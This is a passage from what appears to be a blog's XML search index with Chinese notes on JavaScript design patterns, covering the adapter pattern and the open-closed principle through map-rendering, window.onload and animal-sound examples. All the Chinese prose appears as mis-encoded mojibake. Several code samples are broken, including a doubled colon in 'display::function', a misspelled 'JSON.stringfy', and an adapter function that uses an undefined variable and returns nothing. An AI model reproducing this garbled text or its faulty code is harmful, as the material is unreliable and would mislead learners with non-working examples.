æŽ¥å£ã€‚æ‰€ä»¥é‚£äº›è¿‡åŽ»ç”Ÿäº§å‡ºæ¥çš„åªæ‹¥æœ‰ PS2 æŽ¥å£çš„é¼ æ ‡ã€é”®ç›˜ã€æ¸¸æˆæ‰‹æŸ„ç­‰ï¼Œéœ€è¦ä¸€ä¸ª USB è½¬æŽ¥å£æ‰èƒ½ç»§ç»­æ­£å¸¸å·¥ä½œï¼Œè¿™æ˜¯ PS2-USBé€‚é…å™¨è¯žç”Ÿçš„åŽŸå›  é€‚é…å™¨æ¨¡å¼åº”ç”¨åœ¨ JSON æ ¼å¼æµè¡Œä¹‹å‰ï¼Œå¾ˆå¤š cgi è¿”å›žçš„éƒ½æ˜¯ XML æ ¼å¼çš„æ•°æ®ï¼Œå¦‚æžœä»Šå¤©ä»ç„¶æƒ³ç»§ç»­ä½¿ç”¨è¿™äº›æŽ¥å£ï¼Œæ˜¾ç„¶æˆ‘ä»¬å¯ä»¥åˆ›é€ ä¸€ä¸ªXML-JSON çš„é€‚é…å™¨ã€‚ å½“æˆ‘ä»¬å‘ googleMap å’Œ baiduMap éƒ½å‘å‡ºâ€œæ˜¾ç¤ºâ€è¯·æ±‚æ—¶ï¼ŒgoogleMapå’Œ baiduMap åˆ†åˆ«ä»¥å„è‡ªçš„æ–¹å¼åœ¨é¡µé¢ä¸­å±•çŽ°äº†åœ°å›¾ï¼š 12345678910111213const googleMap = &#123; show:function()&#123;&#125;&#125;const baiduMap = &#123; show:function()&#123;&#125;&#125;const renderMap = function(map)&#123; if(map.show instanceof Function)&#123; map.show(); &#125;&#125;renderMap(googleMap);renderMap(baiduMap); è¿™æ®µç¨‹åºå¾—ä»¥é¡ºåˆ©è¿è¡Œçš„å…³é”®æ˜¯ googleMap å’Œ baiduMap æä¾›äº†ä¸€è‡´çš„ show æ–¹æ³•ï¼Œä½†ç¬¬ä¸‰æ–¹çš„æŽ¥å£æ–¹æ³•å¹¶ä¸åœ¨æˆ‘ä»¬è‡ªå·±çš„æŽ§åˆ¶èŒƒå›´ä¹‹å†…ï¼Œå‡å¦‚ baiduMap æä¾›çš„æ˜¾ç¤ºåœ°å›¾çš„æ–¹æ³•ä¸å« show è€Œå«display å‘¢ï¼Ÿ baiduMap è¿™ä¸ªå¯¹è±¡æ¥æºäºŽç¬¬ä¸‰æ–¹ï¼Œæ­£å¸¸æƒ…å†µä¸‹æˆ‘ä»¬éƒ½ä¸åº”è¯¥åŽ»æ”¹åŠ¨å®ƒã€‚æ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡å¢žåŠ  baiduMapAdapter æ¥è§£å†³é—®é¢˜ï¼š 123456789101112131415161718const googleMap = &#123; show:function()&#123;&#125;&#125;const baiduMap = &#123; display::function()&#123;&#125;&#125;const baiduMapAdapter = &#123; show:function()&#123; return baiduMap.display(); &#125;&#125;const renderMap = function(map)&#123; if(map.show instanceof Function)&#123; map.show(); &#125;&#125;renderMap(googleMap);renderMap(baiduMapAdapter); å†æ¥çœ‹çœ‹å¦å¤–ä¸€ä¸ªä¾‹å­ã€‚å‡è®¾æˆ‘ä»¬æ­£åœ¨ç¼–å†™ä¸€ä¸ªæ¸²æŸ“å¹¿ä¸œçœåœ°å›¾çš„é¡µé¢ã€‚ç›®å‰ä»Žç¬¬ä¸‰æ–¹èµ„æºé‡ŒèŽ·å¾—äº†å¹¿ä¸œçœçš„æ‰€æœ‰åŸŽå¸‚ä»¥åŠå®ƒä»¬æ‰€å¯¹åº”çš„ IDï¼Œå¹¶ä¸”æˆåŠŸåœ°æ¸²æŸ“åˆ°é¡µé¢ä¸­ï¼š 123456789101112131415const getGuangdongCity = function()&#123; const guangdongCity = [&#123; name:'shenzhen', id:11, &#125;,&#123; name:'guangzhou', id:12, &#125;]; return guangdongCity;&#125;const render = function(fn)&#123; console.log(''); document.write(JSON.stringfy(fn()));&#125;render(getGuangdongCity); åˆ©ç”¨è¿™äº›æ•°æ®ï¼Œæˆ‘ä»¬ç¼–å†™å®Œæˆäº†æ•´ä¸ªé¡µé¢ï¼Œå¹¶ä¸”åœ¨çº¿ä¸Šç¨³å®šåœ°è¿è¡Œäº†ä¸€æ®µæ—¶é—´ã€‚ä½†åŽæ¥å‘çŽ°è¿™äº›æ•°æ®ä¸å¤ªå¯é ï¼Œé‡Œé¢è¿˜ç¼ºå°‘å¾ˆå¤šåŸŽå¸‚ã€‚äºŽæ˜¯æˆ‘ä»¬åˆåœ¨ç½‘ä¸Šæ‰¾åˆ°äº†å¦å¤–ä¸€äº›æ•°æ®èµ„æºï¼Œè¿™æ¬¡çš„æ•°æ®æ›´åŠ å…¨é¢ï¼Œä½†é—æ†¾çš„æ˜¯ï¼Œæ•°æ®ç»“æž„å’Œæ­£è¿è¡Œåœ¨é¡¹ç›®ä¸­çš„å¹¶ä¸ä¸€è‡´ã€‚æ–°çš„æ•°æ®ç»“æž„å¦‚ä¸‹: 12345const guangdongCity = &#123; shenzhen:11, guangzhou:12, zhuhai:13&#125; é™¤äº†å¤§åŠ¨å¹²æˆˆåœ°æ”¹å†™æ¸²æŸ“é¡µé¢çš„å‰ç«¯ä»£ç ä¹‹å¤–ï¼Œå¦å¤–ä¸€ç§æ›´è½»ä¾¿çš„è§£å†³æ–¹å¼å°±æ˜¯æ–°å¢žä¸€ä¸ªæ•°æ®æ ¼å¼è½¬æ¢çš„é€‚é…å™¨: 1234567891011const addressAdapter = function(oldAddressfn)&#123; const address = &#123;&#125;, oldAddressfn = oldAddressfn(); for(var i=0,c;c = oldAddress[i++];)&#123; address[c.name] = c.id &#125; return function()&#123; address; &#125;&#125;render(addressAdapter(getGuangdongCity)); é‚£ä¹ˆæŽ¥ä¸‹æ¥éœ€è¦åšçš„ï¼Œå°±æ˜¯æŠŠä»£ç ä¸­è°ƒç”¨ getGuangdongCity çš„åœ°æ–¹ï¼Œç”¨ç»è¿‡ addressAdapteré€‚é…å™¨è½¬æ¢ä¹‹åŽçš„æ–°å‡½æ•°æ¥ä»£æ›¿ã€‚ å°ç»“é€‚é…å™¨æ¨¡å¼æ˜¯ä¸€ç§ç›¸å¯¹æ¯”è¾ƒç®€å•çš„æ¨¡å¼ã€‚è£…é¥°è€…æ¨¡å¼ã€ä»£ç†æ¨¡å¼å’Œå¤–è§‚æ¨¡å¼å…¶å®žéƒ½æŒºç›¸ä¼¼çš„ï¼Œéƒ½æ˜¯ç”±ä¸€ä¸ªå¯¹è±¡æ¥åŒ…è£…å¦ä¸€ä¸ªå¯¹è±¡ã€‚åŒºåˆ«å®ƒä»¬çš„å…³é”®ä»ç„¶æ˜¯æ¨¡å¼çš„æ„å›¾ã€‚ é€‚é…å™¨æ¨¡å¼ä¸»è¦ç”¨æ¥è§£å†³ä¸¤ä¸ªå·²æœ‰çš„æŽ¥å£ä¹‹é—´ä¸åŒ¹é…çš„é—®é¢˜ï¼Œå®ƒä¸è€ƒè™‘è¿™äº›æŽ¥å£æ˜¯æ€Žä¹ˆæ ·å®žçŽ°çš„ï¼Œä¹Ÿä¸è€ƒè™‘å®ƒä»¬å°†æ¥å¯èƒ½ä¼šå¦‚ä½•æ¼”å˜ï¼Œé€‚é…å™¨æ¨¡å¼ä¸éœ€è¦æ”¹å˜å·²æœ‰çš„æŽ¥å£ï¼Œå°±èƒ½å¤Ÿä½¿å®ƒä»¬ååŒä½œç”¨ã€‚ è£…é¥°è€…æ¨¡å¼å’Œä»£ç†æ¨¡å¼ä¹Ÿä¸ä¼šæ”¹å˜åŽŸæ¥å¯¹è±¡çš„æŽ¥å£ï¼Œä½†è£…é¥°è€…æ¨¡å¼çš„ä½œç”¨æ˜¯ä¸ºäº†ç»™å¯¹è±¡å¢žåŠ åŠŸèƒ½ã€‚è£…é¥°è€…æ¨¡å¼å¸¸å¸¸å½¢æˆä¸€æ¡å¾ˆé•¿çš„è£…é¥°é“¾ï¼Œè€Œæ˜¯é€‚é…å™¨æ¨¡å¼é€šå¸¸åªåŒ…è£…ä¸€æ¬¡ã€‚ä»£ç†æ¨¡å¼æ˜¯ä¸ºäº†æŽ§åˆ¶å¯¹å¯¹è±¡çš„è®¿é—®ï¼Œé€šå¸¸ä¹ŸåªåŒ…è£…ä¸€æ¬¡ã€‚ å¤–è§‚æ¨¡å¼çš„ä½œç”¨å€’æ˜¯å’Œé€‚é…å™¨æ¨¡å¼æ¯”è¾ƒç›¸ä¼¼çš„ï¼Œæœ‰äººæŠŠå¤–è§‚æ¨¡å¼çœ‹æˆä¸€ç»„å¯¹è±¡çš„é€‚é…å™¨ï¼Œä½†å¤–è§‚æ¨¡å¼æœ€æ˜¾è‘—çš„ç‰¹ç‚¹æ˜¯å®šä¹‰äº†ä¸€ä¸ªæ–°çš„æŽ¥å£ã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡åŽŸåˆ™å’Œç¼–ç¨‹æŠ€å·§â€”â€”å¼€æ”¾-å°é—­åŽŸåˆ™]]></title>
    <url>%2F2019-03-22-JavaScript%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99%E5%92%8C%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E6%9C%80%E5%B0%91%E7%9F%A5%E8%AF%86%E5%8E%9F%E5%88%99.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ è¯´æ¯ç§è®¾è®¡æ¨¡å¼éƒ½æ˜¯ä¸ºäº†è®©ä»£ç è¿Žåˆå…¶ä¸­ä¸€ä¸ªæˆ–å¤šä¸ªåŽŸåˆ™è€Œå‡ºçŽ°çš„ï¼Œå®ƒä»¬æœ¬èº«å·²ç»èžå…¥äº†è®¾è®¡æ¨¡å¼ä¹‹ä¸­ï¼Œç»™é¢å‘å¯¹è±¡ç¼–ç¨‹æŒ‡æ˜Žäº†æ–¹å‘ã€‚ å‰è¾ˆæ€»ç»“çš„è¿™äº›è®¾è®¡åŽŸåˆ™é€šå¸¸æŒ‡çš„æ˜¯å•ä¸€èŒè´£åŽŸåˆ™ã€é‡Œæ°æ›¿æ¢åŽŸåˆ™ã€ä¾èµ–å€’ç½®åŽŸåˆ™ã€æŽ¥å£éš”ç¦»åŽŸåˆ™ã€åˆæˆå¤ç”¨åŽŸåˆ™å’Œæœ€å°‘çŸ¥è¯†åŽŸåˆ™ JavaScriptè®¾è®¡åŽŸåˆ™å’Œç¼–ç¨‹æŠ€å·§â€”â€”å¼€æ”¾-å°é—­åŽŸåˆ™åœ¨é¢å‘å¯¹è±¡çš„ç¨‹åºè®¾è®¡ä¸­ï¼Œå¼€æ”¾ï€­å°é—­åŽŸåˆ™ï¼ˆOCPï¼‰æ˜¯æœ€é‡è¦çš„ä¸€æ¡åŽŸåˆ™ã€‚å¾ˆå¤šæ—¶å€™ï¼Œä¸€ä¸ªç¨‹åºå…·æœ‰è‰¯å¥½çš„è®¾è®¡ï¼Œå¾€å¾€è¯´æ˜Žå®ƒæ˜¯ç¬¦åˆå¼€æ”¾-å°é—­åŽŸåˆ™çš„ è½¯ä»¶å®žä½“ï¼ˆç±»ã€æ¨¡å—ã€å‡½æ•°ï¼‰ç­‰åº”è¯¥æ˜¯å¯ä»¥æ‰©å±•çš„ï¼Œä½†æ˜¯ä¸å¯ä¿®æ”¹ æ‰©å±• window.onload å‡½æ•°å‡è®¾æˆ‘ä»¬æ˜¯ä¸€ä¸ªå¤§åž‹ Web é¡¹ç›®çš„ç»´æŠ¤äººå‘˜ï¼Œåœ¨æŽ¥æ‰‹è¿™ä¸ªé¡¹ç›®æ—¶ï¼Œå‘çŽ°å®ƒå·²ç»æ‹¥æœ‰ 10 ä¸‡è¡Œä»¥ä¸Šçš„ JavaScript ä»£ç å’Œæ•°ç™¾ä¸ª JS æ–‡ä»¶ã€‚ ä¸ä¹…åŽæŽ¥åˆ°äº†ä¸€ä¸ªæ–°çš„éœ€æ±‚ï¼Œå³åœ¨ window.onload å‡½æ•°ä¸­æ‰“å°å‡ºé¡µé¢ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹æ•°é‡ã€‚è¿™å½“ç„¶éš¾ä¸å€’æˆ‘ä»¬äº†ã€‚äºŽæ˜¯æˆ‘ä»¬æ‰“å¼€æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæœç´¢å‡º window.onload å‡½æ•°åœ¨æ–‡ä»¶ä¸­çš„ä½ç½®ï¼Œåœ¨å‡½æ•°å†…éƒ¨æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š 1234window.onload = function()&#123; // åŽŸæœ‰ä»£ç ç•¥ console.log( document.getElementsByTagName( '*' ).length ); &#125;; åœ¨é¡¹ç›®éœ€æ±‚å˜è¿çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šæ‰¾åˆ°ç›¸å…³ä»£ç ï¼Œç„¶åŽæ”¹å†™å®ƒä»¬ã€‚è¿™ä¼¼ä¹Žæ˜¯ç†æ‰€å½“ç„¶çš„äº‹æƒ…ï¼Œä¸æ”¹åŠ¨ä»£ç æ€Žä¹ˆæ»¡è¶³æ–°çš„éœ€æ±‚å‘¢ï¼Ÿæƒ³è¦æ‰©å±•ä¸€ä¸ªæ¨¡å—ï¼Œæœ€å¸¸ç”¨çš„æ–¹å¼å½“ç„¶æ˜¯ä¿®æ”¹å®ƒçš„æºä»£ç ã€‚å¦‚æžœä¸€ä¸ªæ¨¡å—ä¸å…è®¸ä¿®æ”¹ï¼Œé‚£ä¹ˆå®ƒçš„è¡Œä¸ºå¸¸å¸¸æ˜¯å›ºå®šçš„ã€‚ç„¶è€Œï¼Œæ”¹åŠ¨ä»£ç æ˜¯ä¸€ç§å±é™©çš„è¡Œä¸ºï¼Œä¹Ÿè®¸æˆ‘ä»¬éƒ½é‡åˆ°è¿‡ bug è¶Šæ”¹è¶Šå¤šçš„åœºæ™¯ã€‚åˆšåˆšæ”¹å¥½äº†ä¸€ä¸ª bugï¼Œä½†æ˜¯åˆåœ¨ä¸çŸ¥ä¸è§‰ä¸­å¼•å‘äº†å…¶ä»–çš„ bugã€‚ é‚£ä¹ˆï¼Œæœ‰æ²¡æœ‰åŠžæ³•åœ¨ä¸ä¿®æ”¹ä»£ç çš„æƒ…å†µä¸‹ï¼Œå°±èƒ½æ»¡è¶³æ–°éœ€æ±‚å‘¢ï¼Ÿ 1234567891011Function.prototype.after = function(afterfn)&#123; const self = this; return function()&#123; const ret = self.apply(this,arguments); afterfn.apply(this,arguments); return ret; &#125;&#125;window.onload = (window.onload || function()&#123;&#125;).after(function()&#123; console.log(xxx);&#125;); é€šè¿‡åŠ¨æ€è£…é¥°å‡½æ•°çš„æ–¹å¼ï¼Œæˆ‘ä»¬å®Œå…¨ä¸ç”¨ç†ä¼šä»Žå‰ window.onload å‡½æ•°çš„å†…éƒ¨å®žçŽ°ï¼Œæ— è®ºå®ƒçš„å®žçŽ°ä¼˜é›…æˆ–æ˜¯ä¸‘é™‹ã€‚å°±ç®—æˆ‘ä»¬ä½œä¸ºç»´æŠ¤è€…ï¼Œæ‹¿åˆ°çš„æ˜¯ä¸€ä»½æ··æ·†åŽ‹ç¼©è¿‡çš„ä»£ç ä¹Ÿæ²¡æœ‰å…³ç³»ã€‚åªè¦å®ƒä»Žå‰æ˜¯ä¸ªç¨³å®šè¿è¡Œçš„å‡½æ•°ï¼Œé‚£ä¹ˆä»¥åŽä¹Ÿä¸ä¼šå› ä¸ºæˆ‘ä»¬çš„æ–°å¢žéœ€æ±‚è€Œäº§ç”Ÿé”™è¯¯ã€‚æ–°å¢žçš„ä»£ç å’ŒåŽŸæœ‰çš„ä»£ç å¯ä»¥äº•æ°´ä¸çŠ¯æ²³æ°´ã€‚ å¼€å‘å’Œå°é—­ä¸Šä¸€èŠ‚ä¸º window.onload å‡½æ•°æ‰©å±•åŠŸèƒ½æ—¶ï¼Œç”¨åˆ°äº†ä¸¤ç§æ–¹å¼ã€‚ä¸€ç§æ˜¯ä¿®æ”¹åŽŸæœ‰çš„ä»£ç ï¼Œå¦ä¸€ç§æ˜¯å¢žåŠ ä¸€æ®µæ–°çš„ä»£ç ã€‚ä½¿ç”¨å“ªç§æ–¹å¼æ•ˆæžœæ›´å¥½ï¼Œå·²ç»ä¸è¨€è€Œå–»ã€‚ å°é—­-å¼€å‘åŽŸåˆ™çš„æ€æƒ³ï¼šå½“éœ€è¦æ”¹å˜ä¸€ä¸ªç¨‹åºçš„åŠŸèƒ½æˆ–è€…ç»™è¿™ä¸ªç¨‹åºå¢žåŠ æ–°çš„åŠŸèƒ½çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨å¢žåŠ ä»£ç çš„æ–¹å¼ï¼Œä½†æ˜¯ä¸å…è®¸æ”¹åŠ¨ç¨‹åºçš„æºä»£ç ã€‚ åœ¨çŽ°å®žç”Ÿæ´»ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½æ‰¾åˆ°ä¸€äº›è·Ÿå¼€æ”¾ï€­å°é—­åŽŸåˆ™ç›¸å…³çš„æ•…äº‹ã€‚ä¸‹é¢è¿™ä¸ªæ•…äº‹äººå°½çš†çŸ¥ï¼Œä¸”è·Ÿè‚¥çš‚ç›¸å…³ æœ‰ä¸€å®¶ç”Ÿäº§è‚¥çš‚çš„å¤§ä¼ä¸šï¼Œä»Žæ¬§æ´²èŠ±å·¨èµ„å¼•å…¥äº†ä¸€æ¡ç”Ÿäº§çº¿ã€‚è¿™æ¡ç”Ÿäº§çº¿å¯ä»¥è‡ªåŠ¨å®Œæˆä»ŽåŽŸææ–™åŠ å·¥åˆ°åŒ…è£…æˆç®±çš„æ•´ä¸ªæµç¨‹ï¼Œä½†ç¾Žä¸­ä¸è¶³çš„æ˜¯ï¼Œç”Ÿäº§å‡ºæ¥çš„è‚¥çš‚æœ‰ä¸€å®šçš„ç©ºç›’å‡ çŽ‡ã€‚äºŽæ˜¯è€æ¿åˆä»Žæ¬§æ´²æ‰¾æ¥ä¸€æ”¯ä¸“å®¶å›¢é˜Ÿï¼ŒèŠ±è´¹æ•°ç™¾ä¸‡å…ƒæ”¹é€ è¿™ä¸€ç”Ÿäº§çº¿ï¼Œç»ˆäºŽè§£å†³äº†ç”Ÿäº§å‡ºç©ºç›’è‚¥çš‚çš„é—®é¢˜ã€‚ å¦ä¸€å®¶ä¼ä¸šä¹Ÿå¼•å…¥äº†è¿™æ¡ç”Ÿäº§çº¿ï¼Œä»–ä»¬åŒæ ·é‡åˆ°äº†ç©ºç›’è‚¥çš‚çš„é—®é¢˜ã€‚ä½†ä»–ä»¬çš„è§£å†³åŠžæ³•å¾ˆç®€å•ï¼šç”¨ä¸€ä¸ªå¤§é£Žæ‰‡åœ¨ç”Ÿäº§çº¿æ—è¾¹å¹ï¼Œç©ºç›’è‚¥çš‚å°±ä¼šè¢«å¹èµ°ã€‚ è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬ï¼Œç›¸æ¯”ä¿®æ”¹æºç¨‹åºï¼Œå¦‚æžœé€šè¿‡å¢žåŠ å‡ è¡Œä»£ç å°±èƒ½è§£å†³é—®é¢˜ï¼Œé‚£è¿™æ˜¾ç„¶æ›´åŠ ç®€å•å’Œä¼˜é›…ï¼Œè€Œä¸”å¢žåŠ ä»£ç å¹¶ä¸ä¼šå½±å“åŽŸç³»ç»Ÿçš„ç¨³å®šã€‚è®²è¿°è¿™ä¸ªæ•…äº‹ï¼Œæˆ‘ä»¬çš„ç›®çš„ä¸åœ¨äºŽè¯´æ˜Žé£Žæ‰‡çš„æˆæœ¬æœ‰å¤šä½Žï¼Œè€Œæ˜¯æƒ³è¯´æ˜Žï¼Œå¦‚æžœä½¿ç”¨é£Žæ‰‡è¿™æ ·ç®€å•çš„æ–¹å¼å¯ä»¥è§£å†³é—®é¢˜ï¼Œæ ¹æœ¬æ²¡æœ‰å¿…è¦åŽ»å¤§åŠ¨å¹²æˆˆåœ°æ”¹é€ åŽŸæœ‰çš„ç”Ÿäº§çº¿ã€‚ ç”¨å¯¹è±¡çš„å¤šæ€æ€§æ¶ˆé™¤æ¡ä»¶åˆ†æ”¯è¿‡å¤šçš„æ¡ä»¶åˆ†æ”¯è¯­å¥æ˜¯é€ æˆç¨‹åºè¿åå¼€æ”¾-å°é—­åŽŸåˆ™çš„ä¸€ä¸ªå¸¸è§åŽŸå› ã€‚æ¯å½“éœ€è¦å¢žåŠ ä¸€ä¸ªæ–°çš„ if è¯­å¥æ—¶ï¼Œéƒ½è¦è¢«è¿«æ”¹åŠ¨åŽŸå‡½æ•°ã€‚æŠŠ if æ¢æˆ switch-case æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œè¿™æ˜¯ä¸€ç§æ¢æ±¤ä¸æ¢è¯çš„åšæ³•ã€‚å®žé™…ä¸Šï¼Œæ¯å½“æˆ‘ä»¬çœ‹åˆ°ä¸€å¤§ç‰‡çš„ if æˆ–è€… swtich-case è¯­å¥æ—¶ï¼Œç¬¬ä¸€æ—¶é—´å°±åº”è¯¥è€ƒè™‘ï¼Œèƒ½å¦åˆ©ç”¨å¯¹è±¡çš„å¤šæ€æ€§æ¥é‡æž„å®ƒä»¬ã€‚ åˆ©ç”¨å¯¹è±¡çš„å¤šæ€æ€§æ¥è®©ç¨‹åºéµå®ˆå¼€æ”¾-å°é—­åŽŸåˆ™ï¼Œæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„æŠ€å·§ã€‚ç”¨è®©åŠ¨ç‰©å‘å‡ºå«å£°çš„ä¾‹å­ã€‚ä¸‹é¢å…ˆæä¾›ä¸€æ®µä¸ç¬¦åˆå¼€æ”¾-å°é—­åŽŸåˆ™çš„ä»£ç ã€‚æ¯å½“æˆ‘ä»¬å¢žåŠ ä¸€ç§æ–°çš„åŠ¨ç‰©æ—¶ï¼Œéƒ½éœ€è¦æ”¹åŠ¨makeSound å‡½æ•°çš„å†…éƒ¨å®žçŽ° 123456789101112131415161718192021222324252627282930313233343536373839404142434445// æ”¹åŠ¨å‰var makeSound = function( animal )&#123; if ( animal instanceof Duck )&#123; console.log( 'å˜Žå˜Žå˜Ž' ); &#125;else if ( animal instanceof Chicken )&#123; console.log( 'å’¯å’¯å’¯' ); &#125; &#125;; var Duck = function()&#123;&#125;; var Chicken = function()&#123;&#125;; makeSound( new Duck() ); // è¾“å‡ºï¼šå˜Žå˜Žå˜ŽmakeSound( new Chicken() ); // è¾“å‡ºï¼šå’¯å’¯å’¯// åŠ¨ç‰©ä¸–ç•Œé‡Œå¢žåŠ ä¸€åªç‹—ä¹‹åŽï¼ŒmakeSound å‡½æ•°å¿…é¡»æ”¹æˆï¼švar makeSound = function( animal )&#123; if ( animal instanceof Duck )&#123; console.log( 'å˜Žå˜Žå˜Ž' ); &#125;else if ( animal instanceof Chicken )&#123; console.log( 'å’¯å’¯å’¯' ); &#125;else if ( animal instanceof Dog )&#123; // å¢žåŠ è·Ÿç‹—å«å£°ç›¸å…³çš„ä»£ç  console.log('æ±ªæ±ªæ±ª' ); &#125; &#125;; var Dog = function()&#123;&#125;; makeSound( new Dog() ); // å¢žåŠ ä¸€åªç‹—// æ”¹åŠ¨åŽconst makeSound = function(animal)&#123; animal.sound();&#125;const Duck = function()&#123;&#125;; Duck.prototype.sound = function()&#123; console.log( 'å˜Žå˜Žå˜Ž' ); &#125;; const Chicken = function()&#123;&#125;; Chicken.prototype.sound = function()&#123; console.log( 'å’¯å’¯å’¯' ); &#125;; makeSound( new Duck() ); // å˜Žå˜Žå˜ŽmakeSound( new Chicken() ); // å’¯å’¯å’¯/********* å¢žåŠ åŠ¨ç‰©ç‹—ï¼Œä¸ç”¨æ”¹åŠ¨åŽŸæœ‰çš„ makeSound å‡½æ•° ****************/ var Dog = function()&#123;&#125;; Dog.prototype.sound = function()&#123; console.log( 'æ±ªæ±ªæ±ª' ); &#125;; makeSound( new Dog() ); // æ±ªæ±ªæ±ª æ‰¾å‡ºå˜åŒ–çš„åœ°æ–¹å¼€æ”¾ï€­å°é—­åŽŸåˆ™æ˜¯ä¸€ä¸ªçœ‹èµ·æ¥æ¯”è¾ƒè™šå¹»çš„åŽŸåˆ™ï¼Œå¹¶æ²¡æœ‰å®žé™…çš„æ¨¡æ¿æ•™å¯¼æˆ‘ä»¬æ€Žæ ·äº¦æ­¥äº¦è¶‹åœ°å®žçŽ°å®ƒã€‚ä½†æˆ‘ä»¬è¿˜æ˜¯èƒ½æ‰¾åˆ°ä¸€äº›è®©ç¨‹åºå°½é‡éµå®ˆå¼€æ”¾-å°é—­åŽŸåˆ™çš„è§„å¾‹ï¼Œæœ€æ˜Žæ˜¾çš„å°±æ˜¯æ‰¾å‡ºç¨‹åºä¸­å°†è¦å‘ç”Ÿå˜åŒ–çš„åœ°æ–¹ï¼Œç„¶åŽæŠŠå˜åŒ–å°è£…èµ·æ¥ é€šè¿‡å°è£…å˜åŒ–çš„æ–¹å¼ï¼Œå¯ä»¥æŠŠç³»ç»Ÿä¸­ç¨³å®šä¸å˜çš„éƒ¨åˆ†å’Œå®¹æ˜“å˜åŒ–çš„éƒ¨åˆ†éš”ç¦»å¼€æ¥ã€‚åœ¨ç³»ç»Ÿçš„æ¼”å˜è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦æ›¿æ¢é‚£äº›å®¹æ˜“å˜åŒ–çš„éƒ¨åˆ†ï¼Œå¦‚æžœè¿™äº›éƒ¨åˆ†æ˜¯å·²ç»è¢«å°è£…å¥½çš„ï¼Œé‚£ä¹ˆæ›¿æ¢èµ·æ¥ä¹Ÿç›¸å¯¹å®¹æ˜“ã€‚è€Œå˜åŒ–éƒ¨åˆ†ä¹‹å¤–çš„å°±æ˜¯ç¨³å®šçš„éƒ¨åˆ†ã€‚åœ¨ç³»ç»Ÿçš„æ¼”å˜è¿‡ç¨‹ä¸­ï¼Œç¨³å®šçš„éƒ¨åˆ†æ˜¯ä¸éœ€è¦æ”¹å˜çš„ã€‚ é™¤äº†åˆ©ç”¨å¯¹è±¡çš„å¤šæ€æ€§ä¹‹å¤–ï¼Œè¿˜æœ‰å…¶ä»–æ–¹å¼å¯ä»¥å¸®åŠ©æˆ‘ä»¬ç¼–å†™éµå®ˆå¼€æ”¾-å°é—­åŽŸåˆ™çš„ä»£ç ï¼Œä¸‹é¢å°†è¯¦ç»†ä»‹ç»ã€‚ 1.æ”¾ç½®å€’é’© æ”¾ç½®æŒ‚é’©ï¼ˆhookï¼‰ä¹Ÿæ˜¯åˆ†ç¦»å˜åŒ–çš„ä¸€ç§æ–¹å¼ã€‚æˆ‘ä»¬åœ¨ç¨‹åºæœ‰å¯èƒ½å‘ç”Ÿå˜åŒ–çš„åœ°æ–¹æ”¾ç½®ä¸€ä¸ªæŒ‚é’©ï¼ŒæŒ‚é’©çš„è¿”å›žç»“æžœå†³å®šäº†ç¨‹åºçš„ä¸‹ä¸€æ­¥èµ°å‘ã€‚è¿™æ ·ä¸€æ¥ï¼ŒåŽŸæœ¬çš„ä»£ç æ‰§è¡Œè·¯å¾„ä¸Šå°±å‡ºçŽ°äº†ä¸€ä¸ªåˆ†å‰è·¯å£ï¼Œç¨‹åºæœªæ¥çš„æ‰§è¡Œæ–¹å‘è¢«é¢„åŸ‹ä¸‹å¤šç§å¯èƒ½æ€§ã€‚ ç”±äºŽå­ç±»çš„æ•°é‡æ˜¯æ— é™åˆ¶çš„ï¼Œæ€»ä¼šæœ‰ä¸€äº›â€œä¸ªæ€§åŒ–â€çš„å­ç±»è¿«ä½¿æˆ‘ä»¬ä¸å¾—ä¸åŽ»æ”¹å˜å·²ç»å°è£…å¥½çš„ç®—æ³•éª¨æž¶ã€‚äºŽæ˜¯æˆ‘ä»¬å¯ä»¥åœ¨çˆ¶ç±»ä¸­çš„æŸä¸ªå®¹æ˜“å˜åŒ–çš„åœ°æ–¹æ”¾ç½®æŒ‚é’©ï¼ŒæŒ‚é’©çš„è¿”å›žç»“æžœç”±å…·ä½“å­ç±»å†³å®šã€‚è¿™æ ·ä¸€æ¥ï¼Œç¨‹åºå°±æ‹¥æœ‰äº†å˜åŒ–çš„å¯èƒ½ 2.ä½¿ç”¨å›žè°ƒå‡½æ•° å›žè°ƒå‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„æŒ‚é’©ã€‚æˆ‘ä»¬å¯ä»¥æŠŠä¸€éƒ¨åˆ†æ˜“äºŽå˜åŒ–çš„é€»è¾‘å°è£…åœ¨å›žè°ƒå‡½æ•°é‡Œï¼Œç„¶åŽæŠŠå›žè°ƒå‡½æ•°å½“ä½œå‚æ•°ä¼ 